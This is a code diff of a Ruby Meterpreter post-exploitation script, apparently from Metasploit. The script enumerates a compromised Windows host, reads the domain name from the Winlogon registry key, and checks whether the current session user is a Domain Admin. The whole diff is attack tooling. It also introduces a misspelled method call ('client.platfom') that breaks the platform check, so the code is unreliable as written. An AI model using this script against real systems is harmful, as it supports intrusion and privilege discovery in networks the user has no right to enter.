@@ -24,16 +24,35 @@ def unsupported
 end
 #-------------------------------------------------------------------------------
 #Set General Variables used in the script
-@client =  client
+
+@client = client
 users = ""
 list = []
 host = @client.sys.config.sysinfo['Computer']
-current_user = client.sys.config.getuid.scan(/\S*\\(.*)/)
-domain = @client.fs.file.expand_path("%USERDOMAIN%")
+current_user = @client.sys.config.getuid.scan(/\S*\\(.*)/)
+
+def reg_getvaldata(key,valname)
+    value = nil
+    begin
+        root_key, base_key = @client.sys.registry.splitkey(key)
+        open_key = @client.sys.registry.open_key(root_key, base_key, KEY_READ)
+        v = open_key.query_value(valname)
+        value = v.data
+        open_key.close
+    end
+    return value
+end
+
+domain = reg_getvaldata("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","DefaultDomainName")
+if domain == "" 
+   print_error("domain not found")
+end
+
 # Create Filename info to be appended to downloaded files
 filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
-platform = client.platform.scan(/(win32|win64|php)/)
-unsupported if not platform
+
+unsupported if client.platfom !~ /win32|win64/i
+
 # Create a directory for the logs
 logs = ::File.join(Msf::Config.log_directory, 'scripts','domain_admins')
 # Create the log directory
@@ -78,3 +97,4 @@ if list.index(current_user.join.chomp.downcase)
 else
 	print_error("Current session running as #{domain}\\#{current_user.join.chomp} is not running as Domain Admin")
 end
+
